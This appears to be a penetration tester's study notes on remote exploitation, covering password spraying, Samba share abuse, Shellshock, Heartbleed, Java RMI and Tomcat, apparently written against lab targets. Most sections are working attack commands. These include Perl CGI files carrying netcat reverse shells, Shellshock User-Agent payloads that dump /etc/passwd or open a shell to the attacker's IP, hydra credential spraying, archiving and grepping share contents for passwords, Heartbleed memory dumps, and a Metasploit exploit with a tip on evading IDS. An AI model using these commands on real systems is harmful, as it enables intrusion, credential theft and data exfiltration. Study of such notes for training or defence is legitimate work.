# Notes - Exploitation over the Network - Remote-Exploitation

## Password Spray Attack

- Create users list from this github `https://github.com/insidetrust/statistically-likely-usernames`:
```bash
head -n 50 john.txt >> users.txt
```
- User enumeration using `metasploit -> smtp_enum` and then put the users valid to a file `user_valid.txt`:
```bash
msf > use auxiliary/scanner/smtp/smtp_enum

> set RHOSTS <IP Target>
> set USER_FILE users.txt
> run
```
- SSH, SMTP and SMB are some services we can try our password spray attack against.
- Using `hydra` for brute force attack -> SSH:
```bash
hydra -L users.txt -P passwords.txt ssh://<IP target>
``` 
- Using credential against other systems on then network:
```bash
hydra -l pepito -p pepito123 -M ssh_servers.txt ssh

-M = to specify a list of ssh servers
```
## Exploiting Samba

`SAMBA` -> It provides `file sharing services` to both Windows and Linux users.

- Sambe vulnarable to 4.6.4 version (CVE-2017-7494)

- Identify SAMBA version : 
```bash
nmap --script smb-os-discovery -p445 <target IP>
```
- Investigate which vulnerability exists for that version :
```bash
searchsploit samba 3.0.20
```
- Username Map Script :
```bash
https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
```
- Samba Symlink Directory Traversal is misconfiguration in Samba:
```bash
https://www.samba.org/samba/news/symlink_attack.html
https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/
```
- The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory.
- A pre-requisite to this particular vulnerability requires that the Samba server contains a writeable share and that the "widelinks" parameter in the smb.conf file is set with a value of "yes".
- `smbmap` determines shares available:
```bash
smbmap -H <target IP>
smbclient \\<taregt IP> -N
-> -N anonymous access to the share is allowed and no password is required.
```
- Command for data exfiltration, we can create an archive of all files within a current directory :
```bash
smb: tar c /all_files.tar *

> ls -als all_files.tar
> tar xf /tmp/all_files.tar
> cd /directoty/interesting
> grep -r "password" * 2>&1 /dev/null
```
- `Writeable Samba Share to remote command execution via perl revrse shell`
```bash
smbmap -H 192.168.13.21

-> I see that I have a share with READ and WRITE access
-> Questions:
Is PHP installed? Are there any other web server-interpreted languages we can use to our advantage? Can we upload any files to this directory, and how will the web server handle our files? Can we exploit that to obtain remote command execution?
```
- Connect to share :
```bash
smbclient \\<target IP>\www -N
> ls

For example if I see a file on 'pl'(perl), that means the server on this
```
- Create a file perl and upload with smbclient:
```bash
--> test.pl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
system("id");


smbclient \\<target IP>\www -N
> put test.pl
```
- Webshell on Kali Linux -> `/usr/share/webshells/perl`
- `Netcat` has other uses, such as transferring files and data exfiltration.
```bash
nc -nlvp 1234

-n = to use numeric- only IP addresses (no dns) 
-l = in listen mode
-v = verbose
-p = the port we want to listen on
```
- Other reverse shell or go to `monkey pentester`:
```bash
#!/usr/bin/perl

print "Content-type: text/html\n\n";
system("nc <My IP> 1234 -e /bin/sh");
```

## Exploiting Shellshock

- command :
```bash
env x=‘() { :;}; echo vulnerable’ bash -c “echo this is a test”

> this is a test
```
- One of the primary attack vectors that was seen in the wild following the disclosure of Shellshock was the modification of `User-Agent` strings to include Shellshock payloads intended to run commands on the remote server.
```bash
User-Agent: () { :;}; ping -c 5 -p unique_string attacker.machine
```
- First to do is to locate `CGI` program on the target -> `dirsearch` will help
```bash
./dirsearch.py -u http://192.168.13.29/ -e cgi -r

status 200 -> /cgi-bin/login.cgi

-e = extensions
-r = recursive
```
- Command nmap checks for shellshock exploitation:
```bash
nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi 192.168.13.29 -p 80
```
- Summarize:
```bash
1. Identified a web server with a cgi-bin directory, containing a “login.cgi” file with dirsearch.
2. Confirmed that the file and/or server is likely vulnerable to Shellshock, with the "http-shellshock" Nmap NSE script.
```
- Confirm the vulnerability:
```bash
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi

-U = User-Agent
Use a User-Agent (-U) to echo the contents of /etc/passwd to a local file on our attacker system (login.cgi), and will then display its contents to us (&& cat login.cgi)
```
- To get a reverse shell:
```bash
my shell => nc -nlvp 1234

target shell => wget -U "() { foo;};echo; /bin/nc <My IP> 1234 -e /bin/sh" http://<target IP>/cgi-bin/login.cgi

```
## Exploiting HeartBleed

- Hearbleed was a critical bug affecting OpenSSL versions 1.0.1 through 1.0.1f and allowed for the reading of encrypted data stored in memory due to a faulty implementation of the TLS (Transport Layer Security) and DTLS (Datagram Transport Layer Security) protocols’ heartbeat extension (RFC6520)

- It also allowed for the dumping of the `Private Key` responsible for securing that data over SSL.
- Identify a vulnerable OpenSSL implementation:
```bash
nmap --script ssl-heartbleed 192.168.13.58

Metasploit:

- openssl_heartbleed auxiliary scanner module to dump encrypted memory
msf > use auxiliary/scanner/ssl/openssl_heartbleed

msf auxiliary(scanner/ssl/openssl_heartbleed) > show actions

- Use is the "DUMP" action.
msf auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOST <IP target>
msf auxiliary(scanner/ssl/openssl_heartbleed) > run

Metasploit will store the results of the "leaked" data to a file in your ~/.msf6/loot directory as a .bin file

cd ~/.msf6/loot
strings name_of_file.bin


Use `strings` command for a file .bin and we could see the 'username' and 'password'
```
- if we don’t get any "leaked" data from our first run of a specific tool, `try again`.

## Exploiting Java RMI Registry

- It allows the loading of arbitrary Java classes from an attacker-defined URL.
- On Linux systems is identified by the "GNU Classpath grmiregistry"
- Found on port 1099 TCP and fingerprinted with a Nmap version scan (-sV):
```bash
nmap -sT 192.168.13.29 -p 1099 -sV
```
- With `metasploit`:
```bash
msf > use exploit/multi/misc/java_rmi_server
msf > show options

set SSL to 'true' to evading IDS or Endpoint Detection but these exercices let on default, don't change 

msf exploit (multi/misc/java_rmi_server) > run -j
msf exploit (multi/misc/java_rmi_server) > session -i 1

meterpreter > shell
python -c 'import pty; pty.spwn("/bin/bash")'
bash
```
## Exploiting Java Deserialization
- domain of “Java Deserialization” attacks:
```bash
https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
```
- To explain it simply, `serialization` itself is a process which allows for applications to convert 'data' into a 'binary format', which is suitable for saving to disk.
- In the case of this example, suitable for that data to be transferred over a network and into an application to be then “deserialized” and processed by the application as usable data again
- This process is vulnerable to the `deserialization of untrusted "malicious" data`, which can be supplied by the user, and is ultimately deserialized by an application resulting in code execution without even requiring authentication in most cases.
- Explains of this process:
```bash
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
```
## Exploiting Tomcat
- Default Credentials:
```bash
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
```
- Typically found on port 8180 TCP


























